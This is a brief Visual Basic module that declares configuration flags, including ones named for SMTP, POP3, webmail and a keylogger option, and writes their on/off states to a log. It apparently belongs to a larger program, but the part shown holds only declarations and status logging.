Attribute VB_Name = "Services"
Public ActiveLogging As Boolean
Public ControlLogging As Boolean
Public SMTP As Boolean
Public POP As Boolean
Public WEBMAIL As Boolean
Public keylogger As Boolean
Public LogStruct As String
Public SysTray As Boolean

Public Sub Appendservices()
Booting = True
AppendLog "Active logging: " & ActiveLogging
AppendLog "Control logging: " & ControlLogging
AppendLog "SMTP: " & SMTP
AppendLog "POP3: " & POP
AppendLog "WEBMAIL: " & WEBMAIL
AppendLog "KEYLOG: " & keylogger
AppendLog vbCrLf
End Sub

